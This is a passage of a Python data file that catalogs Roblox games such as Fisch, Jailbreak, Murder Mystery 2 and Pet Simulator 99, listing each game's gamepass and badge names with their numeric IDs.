        BestiaryVeiloftheForsaken   = 'Bestiary: Veil of the Forsaken',   434000111228886,  'Bestiary_Veil_of_the_Forsaken'
        BestiaryWaveborne           = 'Bestiary: Waveborne',              4035200905115276, 'Bestiary_Waveborne'
        BestiaryAzureLagoon         = 'Bestiary: Azure Lagoon',           2613933330373724, 'Bestiary_Azure_Lagoon'
        BestiaryIsleOfNewBeginnings = 'Bestiary: Isle Of New Beginnings', 62688893003566,   'Bestiary_Isle_Of_New_Beginnings'
        BestiaryLushgrove           = 'Bestiary: Lushgrove',              1997541657461197, 'Bestiary_Lushgrove'
        BestiaryEmberreach          = 'Bestiary: Emberreach',             2076076069924140, 'Bestiary_Emberreach'
        BestiaryTheCursedShores     = 'Bestiary: The Cursed Shores',      410506324603873,  'Bestiary_The_Cursed_Shores'
        BestiaryPineShoals          = 'Bestiary: Pine Shoals',            3256592958077820, 'Bestiary_Pine_Shoals'
        BestiaryOpenOcean           = 'Bestiary: Open Ocean',             279267787604757,  'Bestiary_Open_Ocean'
        BestiaryOctophant           = 'Bestiary: Octophant',              2020919067872646, 'Bestiary_Octophant'
        BestiaryAnimalsFirstSea     = 'Bestiary: Animals First Sea',      4460712899366124, 'Bestiary_Animals_First_Sea'
        BestiaryAnimalsSecondSea    = 'Bestiary: Animals Second Sea',     1444909653191652, 'Bestiary_Animals_Second_Sea'
        BestiaryBlueMoonFirstSea    = 'Bestiary: Blue Moon First Sea',    4358181133009953, 'Bestiary_Blue_Moon_First_Sea'
        BestiaryBlueMoonSecondSea   = 'Bestiary: Blue Moon Second Sea',   1132127671855113, 'Bestiary_Blue_Moon_Second_Sea'
        BestiaryLego                = 'Bestiary: Lego',                   507614698244930,  'Bestiary_Lego'
        BestiaryCarrotGarden        = 'Bestiary: Carrot Garden',          246796205450087,  'Bestiary_Carrot_Garden'
        ATripThroughSpace           = 'A Trip Through Space',             3824103730892525, 'A_Trip_Through_Space'
        SilentLullaby               = 'Silent Lullaby',                   1930105118522861, 'Silent_Lullaby'
        LEGOBackpack                = 'LEGO Backpack',                    1434830770922550, 'LEGO_Backpack'
        SharkFrenzy                 = 'Shark Frenzy',                     158854108363478,  'Shark_Frenzy'
        JurassicWorldFischQuest     = 'Jurassic World | Fisch Quest',     2790188123225486, 'Jurassic_World_Fisch_Quest'
        JurassicIslandBestiary      = 'Jurassic Island Bestiary',         385394182585789,  'Jurassic_Island_Bestiary'
        Unnamed                     = '?',                                1857933038828956, 'Unnamed'
        FischFright2024             = 'FISCHFRIGHT 2024',                 2594646182778359, 'Fisch_Fright_2024'
        RuneTier                    = 'Rune Tier',                        3562788701459850, 'Rune_Tier'
        KeyTier                     = 'Key Tier',                         2405124869714453, 'Key_Tier'
        # List Of Badges    
        listOfBadges = [FirstTimeFischer, SpecialSomeone, EconomyExpert, RareHunter, KeepersPupil, AttemptedUpgrade, DivineRelic, Catches50, Catches100, Catches500, Catches1000, Catches2000, Catches3000, Catches4000, Catches5000, Catches10000, LavaCaster, ReconExpert, TruePower, ExperiencedTrueBeauty, BestiaryOcean, BestiaryMoosewood, BestiaryRoslit, BestiarySunstoneIsland, BestiaryTerrapinIsland, BestiaryRoslitVolcano, BestiaryVertigo, BestiaryMushgroveSwamp, BestiarySnowcap, BestiaryEverything, BestiaryKeepersAltar, BestiaryDesolateDeep, BestiaryBrinePool, BestiaryForsakenShores, BestiaryTheDepths, BestiaryAncientArchives, BestiaryAncientIsle, BestiaryOvergrowthCaves, BestiaryFrigidCavern, BestiaryCryogenicCanal, BestiaryGlacialGrotto, BestiaryGrandReef, BestiaryAtlanteanStorm, BestiaryAtlantis, BestiaryVolcanicVents, BestiaryChallengersDeep, BestiaryAbyssalZenith, BestiaryCalmZone, BestiaryVeiloftheForsaken, BestiaryWaveborne, BestiaryAzureLagoon, BestiaryIsleOfNewBeginnings, BestiaryLushgrove, BestiaryEmberreach, BestiaryTheCursedShores, BestiaryPineShoals, BestiaryOpenOcean, BestiaryOctophant, BestiaryAnimalsFirstSea, BestiaryAnimalsSecondSea, BestiaryBlueMoonFirstSea, BestiaryBlueMoonSecondSea, BestiaryLego, BestiaryCarrotGarden, ATripThroughSpace, SilentLullaby, LEGOBackpack, SharkFrenzy, JurassicWorldFischQuest, JurassicIslandBestiary, Unnamed, FischFright2024, RuneTier, KeyTier]

class FiveNightsTD: # https://www.roblox.com/games/15846919378
    placeNames = 'Five Nights TD', 'Five_Nights_TD', 'FNTD', 15846919378
    class Gamepasses:
        VIP                       = 'VIP',                            755213386,  'VIP'
        ShinyHunter               = 'Shiny Hunter',                   970374466,  'Shiny_Hunter'
        StarterPackExclusiveTitle = 'Starter Pack & Exclusive Title', 1232238756, 'Starter_Pack_Exclusive_Title'
        # List Of Gamepasses
        listOfGamepasses = [VIP, ShinyHunter, StarterPackExclusiveTitle]
    class Badges:
        JoinTheGame                = 'Join The Game',                  450768915498982,  'Join_The_Game'
        WinaGame                   = 'Win a Game',                     3361299059765,    'Win_a_Game'
        CompleteGame1              = 'Complete Game 1',                1801557447657311, 'Complete_Game_1'
        CompleteGame2              = 'Complete Game 2',                660308672766666,  'Complete_Game_2'
        FinishGame3                = 'Finish Game 3',                  1249525436995984, 'Finish_Game_3'
        CompleteGame4              = 'Complete Game 4',                1352734224772502, 'Complete_Game_4'
        CompleteGame5              = 'Complete Game 5',                3840686186033460, 'Complete_Game_5'
        CompleteGame6              = 'Complete Game 6',                1289932523675224, 'Complete_Game_6'
        Completedgame7             = 'Completed game 7',               890542128167403,  'Completed_game_7'
        Completedgame8             = 'Completed game 8',               4360266057339738, 'Completed_game_8'
        CompletedGame10            = 'Completed Game 10',              1323923615523391, 'Completed_Game_10'
        TheARG1                    = 'The ARG 1',                      2308722040924793, 'The_ARG_1'
        ARG2Winner                 = 'ARG 2 Winner',                   4348953112147721, 'ARG_2_Winner'
        PlaySummerEvent            = 'Play Summer Event',              4093753784951799, 'Play_Summer_Event'
        CompleteSummerEvent        = 'Complete Summer Event',          4192377969805376, 'Complete_Summer_Event'
        PlayedSummerEvent2         = 'Played Summer Event 2',          2285050971452199, 'Played_Summer_Event_2'
        CompletedSummerEvent2      = 'Completed Summer Event 2',       1733505022543445, 'Completed_Summer_Event_2'
        PlayMilitaryEvent          = 'Play Military Event',            3717054685843370, 'Play_Military_Event'
        CompleteMilitaryEvent      = 'Complete Military Event',        1710710467179779, 'Complete_Military_Event'
        PlayWildWestEvent          = 'Play Wild West Event',           78638580451212,   'Play_WildWest_Event'
        FinishWildWest             = 'Finish Wild West',               4427897814216895, 'Finish_Wild_West'
        PlayHalloweenEvent         = 'Play Halloween Event',           481777508062526,  'Play_Halloween_Event'
        CompleteHalloweenEvent     = 'Complete Halloween Event',       314612341496152,  'Complete_Halloween_Event'
        PlayedSteampunkEvent       = 'Played Steampunk Event',         2794698248016894, 'Played_Steampunk_Event'
        CompletedSteampunkEvent    = 'Completed Steampunk Event',      4321640724737709, 'Completed_Steampunk_Event'
        PlayPrehistoricEvent       = 'Play Prehistoric Event',         1462238683858305, 'Play_Prehistoric_Event'
        CompletePrehistoricEvent   = 'Complete Prehistoric Event',     477734488413301,  'Complete_Prehistoric_Event'
        PlayedChristmasEvent       = 'Played Christmas Event!',        2924114884782147, 'Played_Christmas_Event'
        CompletedChristmasEvent    = 'Completed Christmas Event',      2486341879016297, 'Completed_Christmas_Event'
        FoolsHuntWinner            = 'Fools Hunt Winner',              1350170603923805, 'Fools_Hunt_Winner'
        ClaimCalenderSpecialReward = 'Claim Calender Special Reward',  3554984265461704, 'Claim_Calender_Special_Reward'
        # List Of Badges
        listOfBadges = [JoinTheGame, WinaGame, CompleteGame1, CompleteGame2, FinishGame3, CompleteGame4, CompleteGame5, CompleteGame6, Completedgame7, Completedgame8, CompletedGame10, TheARG1, ARG2Winner, PlaySummerEvent, CompleteSummerEvent, PlayedSummerEvent2, CompletedSummerEvent2, PlayMilitaryEvent, CompleteMilitaryEvent, PlayWildWestEvent, FinishWildWest, PlayHalloweenEvent, CompleteHalloweenEvent, PlayedSteampunkEvent, CompletedSteampunkEvent, PlayPrehistoricEvent, CompletePrehistoricEvent, PlayedChristmasEvent, CompletedChristmasEvent, FoolsHuntWinner, ClaimCalenderSpecialReward]

class Forsaken: # https://www.roblox.com/games/18687417158
    placeNames = 'Forsaken', 'Forsaken', 'Fo', 18687417158
    class Gamepasses:
        VIP                   = 'V.I.P',                   1009460688, 'VIP'
        x2Emotes              = '2x Emotes',               1167749181, '2x_Emotes'
        CameramanKillerAccess = 'Cameraman Killer Access', 1161513424, 'Cameraman_Killer_Access'
        ExtraEmoteWheel       = 'Extra Emote Wheel',       1167749181, 'Extra_Emote_Wheel'
        EarthDayPass          = 'Earth Day Pass',          1175324261, 'Earth_Day_Pass'
        # List Of Gamepasses
        listOfGamepasses = [VIP, x2Emotes, CameramanKillerAccess, ExtraEmoteWheel, EarthDayPass]
    class Badges:
        EternallyForsaken = 'Eternally Forsaken', 411480180016665, 'Eternally_Forsaken'
        # List Of Badges
        listOfBadges = [EternallyForsaken]

class GrandPieceOnline: # https://www.roblox.com/games/1730877806
    placeNames = 'Grand Piece Online', 'Grand_Piece_Online', 'GPO', 1730877806
    class Gamepasses:
        peppodonate        = 'peppo donate',          4795279,    'peppo_donate'
        testeraccess       = 'tester access',         8767755,    'tester_access'
        bari               = 'bari',                  11349062,   'bari'
        BPSeason1          = 'BP Season 1',           99823291,   'BP_Season_1'
        BPSeason2          = 'BP Season 2',           114432469,  'BP_Season_2'
        BPSeason3          = 'BP Season 3',           659418065,  'BP_Season_3'
        BPSeason4          = 'BP Season 4',           676823798,  'BP_Season_4'
        BPSeason5          = 'BP Season 5',           867616837,  'BP_Season_5'
        BPSeason6          = 'BP Season 6',           1010918687, 'BP_Season_6'
        BPSeason7          = 'BP Season 7',           1209942473, 'BP_Season_7'
        EmotePack1         = 'Emote Pack #1',         5233790,    'Emote_Pack_1'
        EmotePack2         = 'Emote Pack #2',         6360299,    'Emote_Pack_2'
        EmotePack3         = 'Emote Pack #3',         9247442,    'Emote_Pack_3'
        MemeEmotes         = 'Meme Emotes',           13465428,   'Meme_Emotes'
        MarineEmotes       = 'Marine Emotes',         13465435,   'Marine_Emotes'
        JojoEmotes         = 'Jojo Emotes',           13465461,   'Jojo_Emotes'
        FacePack1          = 'Face Pack #1',          11023931,   'Face_Pack_1'
        x2_Bank_Storage    = '2x Bank Storage',       9846094,    '2x_Bank_Storage'
        DevilFruitNotifier = 'Devil Fruit Notifier',  10535601,   'Devil_Fruit_Notifier'
        FruitBag           = 'Fruit Bag',             12776768,   'Fruit_Bag'
        Striker            = 'Striker',               12146732,   'Striker'
        CoffinBoat         = 'Coffin Boat',           10897748,   'Coffin_Boat'
        PrivateServers     = 'Private Servers',       12769541,   'Private_Servers'
        MusicSnail         = 'Music Snail',           13467111,   'Music_Snail'
        DrippyFit          = 'Drippy Fit',            14337840,   'Drippy_Fit'
        DungeonMapChooser  = 'Dungeon Map Chooser',   24351992,   'Dungeon_Map_Chooser'
        FastAutoRaceReroll = 'Fast Auto Race Reroll', 843435230,  'Fast_Auto_Race_Reroll'
        # List Of Gamepasses
        listOfGamepasses = [peppodonate, testeraccess, bari, BPSeason1, BPSeason2, BPSeason3, BPSeason4, BPSeason5, BPSeason6, BPSeason7, EmotePack1, EmotePack2, EmotePack3, MemeEmotes, MarineEmotes, JojoEmotes, FacePack1, x2_Bank_Storage, DevilFruitNotifier, FruitBag, Striker, CoffinBoat, PrivateServers, MusicSnail, DrippyFit, DungeonMapChooser, FastAutoRaceReroll]
    class Badges:
        early           = 'early',              2124538094,       'early'
        PaidAccessToken = 'Paid Access Token',  2124636610,       'Paid_Access_Token'
        CertifiedTrader = 'Certified Trader',   2124828978,       'Certified_Trader'
        ANewAdventure   = 'A New Adventure',    2127154256,       'A_New_Adventure'
        phoeyugate      = 'phoeyu gate',        2127585705,       'phoeyu_gate'
        TheHatchGPOEgg  = 'The Hatch: GPO Egg', 2057554081948346, 'The_Hatch_GPO_Egg'
        # List Of Badges
        listOfBadges = [early, PaidAccessToken, CertifiedTrader, ANewAdventure, phoeyugate, TheHatchGPOEgg]

class GrowaGarden: # https://www.roblox.com/games/126884695634066
    placeNames = 'Grow a Garden', 'Grow_a_Garden', 'GaG', 126884695634066
    class Gamepasses:
        Premium_Seed_Pack = 'Premium Seed Pack', 1239020110, 'Premium_Seed_Pack' 
        # List Of Gamepasses
        listOfGamepasses = [Premium_Seed_Pack]
    class Badges:
        G                          = 'G',                             3181581226889239, 'G'
        A                          = 'A',                             2432009301742310, 'A'
        R                          = 'R',                             3495711621999816, 'R'
        D                          = 'D',                             3310355054544865, 'D'
        E                          = 'E',                             3195330021311033, 'E'
        N                          = 'N',                             34852060037844,   'N'
        PurchasedBasicSprinkler    = 'Purchased Basic Sprinkler!',    4330691652818014, 'Purchased_Basic_Sprinkler'
        PurchasedAdvancedSprinkler = 'Purchased Advanced Sprinkler!', 3602894446235962, 'Purchased_Advanced_Sprinkler'
        PurchasedGodlySprinkler    = 'Purchased Godly Sprinkler!',    2213702621912050, 'Purchased_Godly_Sprinkler'
        Spikey                     = 'Spikey!',                       397821235877805,  'Spikey'
        Yourfirstcarrot            = 'Your first carrot!',            3966694991137927, 'Your_first_carrot'
        SHINY                      = 'SHINY!',                        674039989298417,  'SHINY'
        Godapple                   = 'God apple!',                    3833249137800902, 'God_apple'
        GIANTTOMATO                = 'GIANT TOMATO',                  3046817076424642, 'GIANT_TOMATO'
        Carrotconnoisseur          = 'Carrot connoisseur',            1013473936180275, 'Carrot_connoisseur'
        Colorfulfruit              = 'Colorful fruit!',               4429839651101981, 'Colorful_fruit'
        Caretaker                  = 'Care taker',                    393879997365151,  'Care_taker'
        Melonmadness               = 'Melon madness!',                2585648043281722, 'Melon_madness'
        GrandAchievement           = 'Grand Achievement',             1089770809267851, 'Grand_Achievement'
        WhatCameFirst              = 'What Came First?',              157951702469162,  'What_Came_First'
        SeedpackConnoisseur        = 'Seedpack Connoisseur',          2526153383283460, 'Seedpack_Connoisseur'
        PetMaster                  = 'Pet Master',                    4493388333080928, 'Pet_Master'
        # List Of Badges
        listOfBadges = [G, A, R, D, E, N, PurchasedBasicSprinkler, PurchasedAdvancedSprinkler, PurchasedGodlySprinkler, Spikey, Yourfirstcarrot, SHINY, Godapple, GIANTTOMATO, Carrotconnoisseur, Colorfulfruit, Caretaker, Melonmadness, GrandAchievement, WhatCameFirst, SeedpackConnoisseur, PetMaster]

class Jailbreak: # https://www.roblox.com/games/606849621
    placeNames = 'Jailbreak', 'Jailbreak', 'Jb', 606849621
    class Gamepasses:
        ExtraStorage = 'Extra Storage',               2068240,  'Extra_Storage'
        SWATTeam     = 'SWAT Team',                   2070427,  'SWAT_Team'
        CarStereo    = 'Car Stereo',                  2218187,  'Car_Stereo'
        DuffelBag    = 'Duffel Bag',                  2219040,  'Duffel_Bag'
        VIP          = 'VIP (Very Important Player)', 2296901,  'VIP_Very_Important_Player'
        ProGarage    = 'Pro Garage',                  2725211,  'Pro_Garage'
        CrimeBoss    = 'Crime Boss',                  4974038,  'Crime_Boss'
        XPBoost      = 'XP Boost',                    6631507,  'XP_Boost'
        VIPTrading   = 'VIP Trading',                 56149618, 'VIP_Trading'
        # List Of Gamepasses
        listOfGamepasses = [ExtraStorage, SWATTeam, CarStereo, DuffelBag, VIP, ProGarage, CrimeBoss, XPBoost, VIPTrading]
    class Badges:
        MVP                                 = 'MVP (Most Valuable Player)',              958186367,  'MVP_Most_Valuable_Player'
        TopGun                              = 'Top Gun',                                 958186842,  'Top_Gun'
        BankBust                            = 'Bank Bust',                               958186941,  'Bank_Bust'
        DrillSergeant                       = 'Drill Sergeant',                          958187053,  'Drill_Sergeant'
        MasterCriminal                      = 'Master Criminal',                         958187226,  'Master_Criminal'
        BonnieAndClyde                      = 'Bonnie & Clyde',                          958187343,  'Bonnie_And_Clyde'
        SmoothCriminal                      = 'Smooth Criminal',                         958187470,  'Smooth_Criminal'
        MeetTheDevs                         = 'Meet The Devs!',                          1399506017, 'Meet_The_Devs'
        JailbreakRBBattlesChampionshipBadge = 'Jailbreak RB Battles Championship Badge', 2124624990, 'Jailbreak_RB_Battles_Championship_Badge'
        DefeatTheCEO                        = 'Defeat The CEO!',                         2129891386, 'Defeat_The_CEO'
        Unnamed1                            = '??? 1',                                   2124575784, 'Unnamed_1'
        Unnamed2                            = '??? 2',                                   2129465542, 'Unnamed_2'
        # List Of Badges
        listOfBadges = [MVP, TopGun, BankBust, DrillSergeant, MasterCriminal, BonnieAndClyde, SmoothCriminal, MeetTheDevs, JailbreakRBBattlesChampionshipBadge, DefeatTheCEO, Unnamed1, Unnamed2]

class JujutsuInfinite: # https://www.roblox.com/games/10450270085
    placeNames = 'Jujutsu Infinite', 'Jujutsu_Infinite', 'JI', 10450270085
    class Gamepasses:
        InnateSlot3         = 'Innate Slot 3',        77102481,  'Innate_Slot_3'
        InnateSlot4         = 'Innate Slot 4',        77102528,  'Innate_Slot_4'
        HeavenlyRestriction = 'Heavenly Restriction', 77102969,  'Heavenly_Restriction'
        ExtraEmoteSlots     = 'Extra Emote Slots',    77103194,  'Extra_Emote_Slots'
        ItemNotifier        = 'Item Notifier',        77103458,  'Item_Notifier'
        InnateBag           = 'Innate Bag',           77110710,  'Innate_Bag'
        SkipSpins           = 'Skip Spins',           259500454, 'Skip_Spins'
        # List Of Gamepasses
        listOfGamepasses = [InnateSlot3, InnateSlot4, HeavenlyRestriction, ExtraEmoteSlots, ItemNotifier, InnateBag, SkipSpins]
    class Badges:
        PlayedTutorial        = 'Played Tutorial',         1768126716824041, 'Played_Tutorial'
        PlayedJujutsuInfinite = 'Played Jujutsu Infinite', 2136221767,       'Played_Jujutsu_Infinite'
        DomainExpansion       = 'Domain Expansion',        2136222659,       'Domain_Expansion'
        SpecialGradeSorcerer  = 'Special Grade Sorcerer',  2136224010,       'Special_Grade_Sorcerer'
        # List Of Badges
        listOfBadges = [PlayedTutorial, PlayedJujutsuInfinite, DomainExpansion, SpecialGradeSorcerer]

class KingLegacy: # https://www.roblox.com/games/4520749081
    placeNames = 'King Legacy', 'King_Legacy', 'KL', 4520749081
    class Gamepasses:
        Tips              = 'Tips',                7866886,    'Tips'
        QuestExperiencex2 = 'Quest Experience x2', 7888149,    'Quest_Experience_x2'
        QuestMoneyx2      = 'Quest Money x2',      8114853,    'Quest_Money_x2'
        ItemDropx2        = 'Item Drop x2',        18044132,   'Item_Drop_x2'
        NightBlade        = 'Night Blade',         7929804,    'Night_Blade'
        FruitPosition     = 'Fruit Position',      7936106,    'Fruit_Position'
        ConquerorAbility  = 'Conqueror Ability',   8287391,    'Conqueror_Ability'
        CoffinBoat        = 'Coffin Boat',         9876237,    'Coffin_Boat'
        LegacyPose        = 'Legacy Pose',         18399361,   'Legacy_Pose'
        FruitBag          = 'Fruit Bag',           23746192,   'Fruit_Bag'
        VoltBundle        = 'Volt Bundle',         1324228345, 'Volt_Bundle'
        # List Of Gamepasses
        listOfGamepasses = [Tips, QuestExperiencex2, QuestMoneyx2, ItemDropx2, NightBlade, FruitPosition, ConquerorAbility, CoffinBoat, LegacyPose, FruitBag, VoltBundle]
    class Badges:
        SecondSea = 'Second Sea', 570761085363018,  'Second_Sea'
        ThirdSea  = 'Third Sea',  2677309180656288, 'Third_Sea'
        # List Of Badges
        listOfBadges = [SecondSea, ThirdSea]

class MurderMystery2: # https://www.roblox.com/games/142823291
    placeNames = 'Murder Mystery 2', 'Murder_Mystery_2', 'MM2', 142823291
    class Gamepasses:
        Elite                    = 'Elite',                                   429957 ,    'Elite'
        Radio                    = 'Radio',                                   1308795,    'Radio'
        RandomizedFaces1         = 'Randomized Faces 1',                      79442,      'Randomized_Faces_1'
        RandomizedFaces2         = 'Randomized Faces 2',                      429356,     'Randomized_Faces_2'
        ShadowItemPack           = 'Shadow Item Pack',                        1201672,    'Shadow_Item_Pack'
        ClockworkItemPack        = 'Clockwork Item Pack ',                    1491260,    'Clockwork_Item_Pack'
        BIT8ItemPack             = '8-BIT Item Pack',                         1531578,    '8_BIT_Item_Pack'
        FuturisticItemPack       = 'Futuristic Item Pack',                    1712843,    'Futuristic_Item_Pack'
        AmericanItemPack         = 'American Item Pack',                      2002511,    'American_Item_Pack'
        HalloweenItemPack        = 'Halloween Item Pack',                     3346253,    'Halloween_Item_Pack'
        WinterItemPack           = 'Winter Item Pack',                        3646351,    'Winter_Item_Pack'
        Batwing                  = 'Batwing',                                 5299081,    'Batwing'
        Icewing                  = 'Icewing',                                 5593012,    'Icewing'
        GhostlyItemPack          = 'Ghostly Item Pack',                       7435036,    'Ghostly_Item_Pack'
        FrostbiteItemPack        = 'Frostbite Item Pack',                     7795820,    'Frostbite_Item_Pack'
        Bioblade                 = 'Bioblade',                                8456434,    'Bioblade'
        Prismatic                = 'Prismatic',                               10747452,   'Prismatic'
        VampiresEdge             = 'Vampire\'s Edge',                         12448341,   'Vampires_Edge'
        Peppermint               = 'Peppermint',                              13308756,   'Peppermint'
        Cookieblade              = 'Cookieblade',                             13502690,   'Cookieblade'
        Heartblade               = 'Heartblade',                              15066851,   'Heartblade'
        Eggblade                 = 'Eggblade',                                16462794,   'Eggblade'
        EVOReaver                = 'EVO: Reaver',                             24102758,   'EVO_Reaver'
        EVOIcecrusher            = 'EVO: Icecrusher',                         112956652,  'EVO_Icecrusher'
        EVOGingerscythe          = 'EVO: Gingerscythe',                       674830453,  'EVO_Gingerscythe'
        EVOSynthwave             = 'EVO: Synthwave',                          1326724250, 'EVO_Synthwave'
        PACKLatte                = 'PACK: Latte',                             658376309,  'PACK_Latte'
        GODLYNebula              = 'GODLY: Nebula',                           21348436,   'GODLY_Nebula'
        GODLYIceBeam             = 'GODLY: Ice Beam',                         26304638,   'GODLY_Ice_Beam'
        GODLYIceFlake            = 'GODLY: Ice Flake',                        26304644,   'GODLY_Ice_Flake'
        BUNDLEIceBeamFlakeEffect = 'BUNDLE: Ice Beam, Ice Flake, Ice Effect', 26304640,   'BUNDLE_Ice_Beam_Ice_Flake_Ice_Effect'
        GODLYPlasmabeam          = 'GODLY: Plasmabeam',                       55292828,   'GODLY_Plasmabeam'
        GODLYPlasmablade         = 'GODLY: Plasmablade',                      55292879,   'GODLY_Plasmablade'
        BUNDLEPlasma             = 'BUNDLE: Plasma',                          55292987,   'BUNDLE_Plasma'
        GODLYPhantom             = 'GODLY: Phantom',                          93780280,   'GODLY_Phantom'
        GODLYSpectre             = 'GODLY: Spectre',                          93780323,   'GODLY_Spectre'
        BUNDLEPhantomSpectre     = 'BUNDLE: Phantom & Spectre',               93780371,   'BUNDLE_Phantom_Spectre'
        GODLYBlossom             = 'GODLY: Blossom',                          131048887,  'GODLY_Blossom'
        GODLYSakura              = 'GODLY: Sakura',                           131048950,  'GODLY_Sakura'
        BUNDLESakura             = 'BUNDLE: Sakura',                          131048794,  'BUNDLE_Sakura'
        GODLYRainbowGun          = 'GODLY: Rainbow Gun',                      156618021,  'GODLY_Rainbow_Gun'
        GODLYRainbow             = 'GODLY: Rainbow',                          156618096,  'GODLY_Rainbow'
        BUNDLERainbow            = 'BUNDLE: Rainbow',                         156618061,  'BUNDLE_Rainbow'
        GODLYOcean               = 'GODLY: Ocean',                            200073999,  'GODLY_Ocean'
        GODLYWaves               = 'GODLY: Waves',                            200074174,  'GODLY_Waves'
        BUNDLEBeachPack          = 'BUNDLE: Beach Pack',                      200074115,  'BUNDLE_Beach_Pack'
        GODLYDarkshot            = 'GODLY: Darkshot',                         273009597,  'GODLY_Darkshot'
        GODLYDarksword           = 'GODLY: Darksword',                        273009675,  'GODLY_Darksword'
        BUNDLEDarknessPack       = 'BUNDLE: Darkness Pack',                   273009641,  'BUNDLE_Darkness_Pack'
        GODLYTurkey              = 'GODLY: Turkey',                           658667213,  'GODLY_Turkey'
        GODLYFlowerwoodGun       = 'GODLY: Flowerwood Gun',                   768389355,  'GODLY_Flowerwood_Gun'
        GODLYFlowerwood          = 'GODLY: Flowerwood',                       769140200,  'GODLY_Flowerwood'
        BUNDLEFlowerwood         = 'BUNDLE: Flowerwood',                      767127317,  'BUNDLE_Flowerwood'
        GODLYPearlshine          = 'GODLY: Pearlshine',                       850293409,  'GODLY_Pearlshine'
        GODLYPearl               = 'GODLY: Pearl',                            850003963,  'GODLY_Pearl'
        BUNDLEPearls             = 'BUNDLE: Pearls',                          850387075,  'BUNDLE_Pearls'
        GODLYSpirit              = 'GODLY: Spirit',                           942004724,  'GODLY_Spirit'
        GODLYSoul                = 'GODLY: Soul',                             941784760,  'GODLY_Soul'
        BUNDLESpiritSoul         = 'BUNDLE: Spirit & Soul',                   942030669,  'BUNDLE_Spirit_Soul'
        GODLYBorealis            = 'GODLY: Borealis',                         1008841389, 'GODLY_Borealis'
        GODLYAustralis           = 'GODLY: Australis',                        1008813284, 'GODLY_Australis'
        BUNDLEAurora             = 'BUNDLE: Aurora',                          1009231264, 'BUNDLE_Aurora'
        GODLYFlora               = 'GODLY: Flora',                            1167438350, 'GODLY_Flora'
        GODLYBloom               = 'GODLY: Bloom',                            1165838634, 'GODLY_Bloom'
        BUNDLEBloom              = 'BUNDLE: Bloom',                           1166580569, 'BUNDLE_Bloom'
        GODLYXenoknife           = 'GODLY: Xenoknife',                        1534775989, 'GODLY_Xenoknife'
        GODLYXenoshot            = 'GODLY: Xenoshot',                         1533049236, 'GODLY_Xenoshot'
        BUNDLEXenotech           = 'BUNDLE: Xenotech',                        1535587918, 'BUNDLE_Xenotech'
        # List Of Gamepasses
        listOfGamepasses = [Elite, Radio, RandomizedFaces1, RandomizedFaces2, ShadowItemPack, ClockworkItemPack, BIT8ItemPack, FuturisticItemPack, AmericanItemPack, HalloweenItemPack, WinterItemPack, Batwing, Icewing, GhostlyItemPack, FrostbiteItemPack, Bioblade, Prismatic, VampiresEdge, Peppermint, Cookieblade, Heartblade, Eggblade, EVOReaver, EVOIcecrusher, EVOGingerscythe, EVOSynthwave, PACKLatte, GODLYNebula, GODLYIceBeam, GODLYIceFlake, BUNDLEIceBeamFlakeEffect, GODLYPlasmabeam, GODLYPlasmablade, BUNDLEPlasma, GODLYPhantom, GODLYSpectre, BUNDLEPhantomSpectre, GODLYBlossom, GODLYSakura, BUNDLESakura, GODLYRainbowGun, GODLYRainbow, BUNDLERainbow, GODLYOcean, GODLYWaves, BUNDLEBeachPack, GODLYDarkshot, GODLYDarksword, BUNDLEDarknessPack, GODLYTurkey, GODLYFlowerwoodGun, GODLYFlowerwood, BUNDLEFlowerwood, GODLYPearlshine, GODLYPearl, BUNDLEPearls, GODLYSpirit, GODLYSoul, BUNDLESpiritSoul, GODLYBorealis, GODLYAustralis, BUNDLEAurora, GODLYFlora, GODLYBloom, BUNDLEBloom, GODLYXenoknife, GODLYXenoshot, BUNDLEXenotech]
    class Badges:
        Level10            = 'Level 10',             196198137,  'Level_10'
        Level20            = 'Level 20',             196198654,  'Level_20'
        Level30            = 'Level 30',             196198776,  'Level_30'
        Level40            = 'Level 40',             196199518,  'Level_40'
        Level50            = 'Level 50',             196200089,  'Level_50'
        Level60            = 'Level 60',             196200207,  'Level_60'
        Level70            = 'Level 70',             196200425,  'Level_70'
        Level80            = 'Level 80',             196200625,  'Level_80'
        Level90            = 'Level 90',             196200691,  'Level_90'
        Level100           = 'Level 100',            196200785,  'Level_100'
        JoinedtheSurvivors = 'Joined the Survivors', 2129030855, 'Joined_the_Survivors'
        JoinedtheZombies   = 'Joined the Zombies',   2129030849, 'Joined_the_Zombies'
        RBKnife            = 'RB Knife',             2124636122, 'RB_Knife'
        # List Of Badges
        listOfBadges = [Level10, Level20, Level30, Level40, Level50, Level60, Level70, Level80, Level90, Level100, JoinedtheSurvivors, JoinedtheZombies, RBKnife]

class PetSimulator99: # https://www.roblox.com/games/8737899170
    placeNames = 'Pet Simulator 99', 'Pet_Simulator_99', 'PS99', 8737899170
    class Gamepasses:
        VIP              = 'VIP!',                257811346,  'VIP'
        Lucky            = 'Lucky!',              205379487,  'Lucky'
        UltraLucky       = 'Ultra Lucky!',        257803774,  'Ultra_Lucky'
        MagicEggs        = 'Magic Eggs!',         258567677,  'Magic_Eggs'
        Plus15Pets       = '+15 Pets!',           259437976,  'Plus_15_Pets'
        Plus15Eggs       = '+15 Eggs!',           655859720,  'Plus_15_Eggs'
        HugeHunter       = 'Huge Hunter!',        264808140,  'Huge_Hunter'
        AutoFarm         = 'Auto Farm!',          265320491,  'Auto_Farm'
        AutoTap          = 'Auto Tap!',           265324265,  'Auto_Tap'
        DaycareSlots     = 'Daycare Slots!',      651611000,  'Daycare_Slots'
        SuperDrops       = 'Super Drops!',        690997523,  'Super_Drops'
        DoubleStars      = 'Double Stars!',       720275150,  'Double_Stars'
        SuperShinyHunter = 'Super Shiny Hunter!', 975558264,  'Super_Shiny_Hunter'
        Pass             = 'Pass',                1099764410, 'Pass'
        # List Of Gamepasses
        listOfGamepasses = [VIP, Lucky, UltraLucky, MagicEggs, Plus15Pets, Plus15Eggs, HugeHunter, AutoFarm, AutoTap, DaycareSlots, SuperDrops, DoubleStars, SuperShinyHunter, Pass]
    class Badges:
        Welcome             = 'Welcome',                 2153913164,       'Welcome'
        TheHuntFirstEdition = 'The Hunt: First Edition', 3189151177666639, 'The_Hunt_First_Edition'
        TheHuntMegaEdition  = 'The Hunt: Mega Edition',  754796678735151,  'The_Hunt_Mega_Edition'
        JourneysEnd         = 'Journey\'s End',          327631483993374,  'Journeys_End'
        # List Of Badges
        listOfBadges = [Welcome, TheHuntFirstEdition, TheHuntMegaEdition, JourneysEnd]
        
class PETSGO: # https://www.roblox.com/games/18901165922
    placeNames = 'PETS GO', 'PETS_GO', 'PG', 18901165922
    class Gamepasses:
